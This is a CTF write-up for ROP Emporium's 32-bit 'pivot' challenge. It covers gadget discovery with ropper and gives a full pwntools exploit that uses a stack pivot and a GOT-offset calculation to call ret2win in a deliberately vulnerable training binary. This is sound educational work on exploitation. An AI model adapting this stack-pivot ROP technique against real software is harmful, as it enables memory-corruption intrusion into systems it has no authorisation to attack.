# pivot - 32 Bit
Program execution:
```
pivot by ROP Emporium
x86

Call ret2win() from libpivot
The Old Gods kindly bestow upon you a place to pivot: 0xf7d23f10
Send a ROP chain now and it will land there
> <input_1_here>
Thank you!

Now please send your stack smash
> <input_2_here>
Thank you!

Exiting
```
Unlike the prior challenges there are 2 prompts for input, with the intent being we can pivot from one part of the stack to the other.

Run checksec: `checksec ./pivot32`
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  b'.'
```
Again, `main` calls `pwnme`.:
```
08048750  int32_t pwnme(size_t arg1)

08048761      void var_2c
08048761      memset(&var_2c, 0, 0x20)
08048771      puts(str: "Call ret2win() from libpivot")
08048784      printf(format: "The Old Gods kindly bestow upon …", arg1)
08048794      puts(str: "Send a ROP chain now and it will…")
080487a4      printf(format: &data_8048994)
080487b9      read(fd: 0, buf: arg1, nbytes: 0x100)
080487c9      puts(str: "Thank you!\n")
080487d9      puts(str: "Now please send your stack smash")
080487e9      printf(format: &data_8048994)
080487fc      read(fd: 0, buf: &var_2c, nbytes: 0x38)
08048816      return puts(str: "Thank you!")
```
The first `read` (080487b9) will read in 0x100 bytes so this will be our larger ROP chain. The second `read` (080487fc) will only read in 0x38 bytes which won't be enough for a full chain, so this is just for stack smashing so we can pivot to the first `read` buffer.
Our second buffer is offset 0x28 down from our `ebp` or 0x2c from the saved `eip` return address as indicated by BinaryNinja's default variable naming `&var_2c`. This also means we can only write 0xC additional bytes after the padding.

Notice that `pwnme`'s parameter `arg1` is used for our larger chain. Luckily the first `printf` (08048784) leaks this address for us which makes pivoting much easier.

In order to call `ret2win` which resides in `libpivot32.so`, we need to get the `.got.plt` entry for `foothold_function` (also in `libpivot32.so`) and then add the offset difference between the two functions, to get the actual address of `ret2win`.

Technically we don't actually **need** to pivot to the larger buffer. What I mean by this, is the following would be a simple solution

1. Enter garbage to first buffer.
2. Enter a payload of 0x2c padding, `foothold_function` `.plt` address and `pwnme` address to return to.
3. Enter garbage to first buffer.
4. Enter a payload of 0x2c padding, `puts` `.plt` address, `pwnme` address to return to, and `foothold_function` `.got.plt` address to print the contents of using `put`.
5. Enter garbage to first buffer.
6. Enter a payload of 0x2c padding, and `ret2win` address calculated using the `foothold_function` actual address and offset difference.

This does require `pwnme` to run 3 times, but it's a pretty straightforward solution that doesn't need much thinking.

But, to keep in the spirit of the challenge that wants us to do a pivot from stack to heap (since `malloc` was used for the larger buffer), let's find some proper gadgets to use. We'll start by looking for stack pivoting gadgets.

`ropper -f pivot32 --stack-pivot`:
```
0x080485f2: add esp, 0x10; leave; ret;
0x08048811: add esp, 0x10; nop; leave; ret;
0x08048895: add esp, 0xc; pop ebx; pop esi; pop edi; pop ebp; ret;
0x080484a6: add esp, 8; pop ebx; ret;
0x0804861e: ret 0xeac1;
0x0804882e: xchg eax, esp; ret;

6 gadgets found
```
`xchg eax, esp` will do us just nicely. But we need a way to get the heap address into eax, so that it can be swapped with `esp` and then the program will refer to the heap instead of stack when looking for the next `eip` to jump to.

`ropper -f pivot32  --search 'pop eax'`:
```
[INFO] File: pivot32
0x0804882c: pop eax; ret;
```

Easy peasy, so our stack smashing payload will look like
```python
payload = b'A' * (0x28 + 0x4)   # padding
payload += p32(0x0804882c)      # pop eax; ret;
payload += p32(arg1)            # address that was leaked for us
payload += p32(0x0804882e)      # xchg eax, esp; ret;
```

Now to make our larger rop chain. Let's see if it's possible to dynamically call an arbitrary function pointer.
`ropper -f pivot32  --search 'call'`:
```
[INFO] File: pivot32
0x0804880c: call 0x500; add esp, 0x10; nop; leave; ret;
0x08048827: call 0x510; pop eax; ret;
0x0804881d: call 0x520; sub esp, 0xc; push 1; call 0x510; pop eax; ret;
0x0804859d: call 0x530; hlt; mov ebx, dword ptr [esp]; ret;
0x080484a1: call 0x560; add esp, 8; pop ebx; ret;
0x0804865f: call 0x5d0; mov byte ptr [0x804a040], 1; leave; ret;
0x08048592: call dword ptr [eax + 0x51];
0x0804858b: call dword ptr [eax - 0x73];
0x080485f0: call eax;
0x080485f0: call eax; add esp, 0x10; leave; ret;
0x0804863d: call edx;
0x0804863d: call edx; add esp, 0x10; leave; ret;
```

So looks like we would be able to do so with `eax` or `edx` so we need to get the sum of the `.got.plt` value of `foothold_function` and the offset difference between `foothold_function` and `ret2win` into one of these registers. We know we're going to need a gadget like `mov ???, [???]` to get the `.got.plt` so we'll check for that to work out the best register to use.
`ropper -f pivot32  --search 'mov ???, [???]'`:
```
[INFO] File: pivot32
0x08048830: mov eax, dword ptr [eax]; ret;
0x080485a3: mov ebx, dword ptr [esp]; ret;
```

Well that simplifies things - we'll need to use `eax` (0x08048830) which is convenient since we already have a `pop eax` gadget to provide the pointer to `.got.plt`.
We'll now need an `add` gadget so we can add the offset to `ret2win`.
`ropper -f pivot32  --search 'add eax'`:
```
[INFO] File: pivot32
0x08048665: add eax, 0x804a040; add ecx, ecx; ret;
0x08048833: add eax, ebx; ret;
```

We can add the contents of `ebx` to `eax` (0x08048833) so now we just need a way of loading data into `ebx`.
`ropper -f pivot32  --search 'pop ebx'`:
```
[INFO] File: pivot32
0x08048898: pop ebx; pop esi; pop edi; pop ebp; ret;
0x080484a9: pop ebx; ret;
```
And we have one such gadget (0x080484a9). So this means we'll be all set to get the address of `ret2win` into `eax` allowing us to use the `call eax` gadget (0x080485f0) we found earlier.

And altogether we get the final exploit script:
```python
#!/usr/bin/python3

from pwn import *

PROG_NAME = "./pivot32"
LIB_PIVOT = "./libpivot32.so"
p = process(PROG_NAME)
elf = p.elf
lib = ELF(LIB_PIVOT)

if args.ATTACH:
    gdb.attach(p, '''break main''')

pop_eax_addr = 0x0804882c           # pop eax; ret;
xchg_eax_esp_addr = 0x0804882e      # xchg eax, esp; ret;
mov_eax_ptr_eax_addr = 0x08048830   # mov eax, dword ptr [eax]; ret;
pop_ebx_addr = 0x080484a9           # pop ebx; ret;
add_eax_ebx_addr = 0x08048833       # add eax, ebx; ret;
call_eax_addr = 0x080485f0          # call eax;

# leak heap address
p.recvuntil(b': ')
heap_pivot_addr = p.recvline().rstrip()
heap_pivot_addr = int(heap_pivot_addr, 16)

# need to call foothold_function once to populate its GOT
# entry correctly
main_payload = p32(elf.plt['foothold_function'])
main_payload += p32(pop_eax_addr)
main_payload += p32(elf.got['foothold_function'])
main_payload += p32(mov_eax_ptr_eax_addr)
main_payload += p32(pop_ebx_addr)
# add diff between ret2win and foothold_function offsets to
# the real address of foothold_function will get us the real
# address of ret2win
main_payload += p32(lib.symbols['ret2win'] - lib.symbols['foothold_function'])
main_payload += p32(add_eax_ebx_addr)
main_payload += p32(call_eax_addr)

p.recvuntil(b'> ')
p.sendline(main_payload)

smash_payload = b'A' * (0x28 + 0x4)
smash_payload += p32(pop_eax_addr)
smash_payload += p32(heap_pivot_addr)
# set stack pointer to our heap address
smash_payload += p32(xchg_eax_esp_addr)

p.recvuntil(b'> ')
p.sendline(smash_payload)

p.interactive()
```

And we get the flag:
```
Thank you!
ROPE{a_placeholder_32byte_flag!}
```